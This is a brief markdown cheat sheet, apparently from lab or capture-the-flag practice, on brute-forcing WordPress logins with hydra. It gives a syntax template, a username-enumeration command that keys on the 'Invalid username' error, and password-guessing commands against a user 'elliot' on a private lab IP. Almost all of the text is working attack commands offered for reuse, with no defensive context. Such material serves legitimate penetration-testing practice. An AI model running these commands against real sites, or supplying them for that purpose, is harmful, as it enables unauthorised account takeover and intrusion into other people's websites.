## wplogin 
`when wpscan can't enumerate users`

tip : just copy the post request and arrange it
```
hydra -L USERFILE -P PASSWORDFILE DOMAIN/IP METHOD "REDIRECTIONURL:PARAMETERS:FAILMESSAGE:H=COOKIES"
```
**FOR POST req** - http-post-form

**FOR GET req** - http-get-form



**username** 
```bash
hydra -L fsocity.dic -P /usr/share/wordlists/wfuzz/others/common_pass.txt 192.168.56.115 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.115%2Fwp-admin%2F&testcookie=1:Invalid username" -V
```

**password**

- syntax

```bash
hydra -vV -l [valid-username] -P [password-list] [IP] [http-post-form] '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
```
eg
```bash
hydra -vV -l elliot -P password-list 192.168.56.115 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
```
